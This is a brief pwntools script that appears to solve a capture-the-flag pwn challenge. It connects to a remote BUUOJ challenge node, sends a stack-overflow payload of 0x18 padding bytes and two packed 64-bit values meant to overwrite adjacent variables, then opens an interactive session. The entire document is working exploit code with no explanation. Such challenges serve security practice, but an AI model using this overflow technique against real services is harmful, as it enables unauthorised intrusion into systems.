from pwn import *

sh=remote("node5.buuoj.cn",26458)

payload=0x18*b'a'+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3FB999999999999A)
sh.sendline(payload)

sh.interactive()
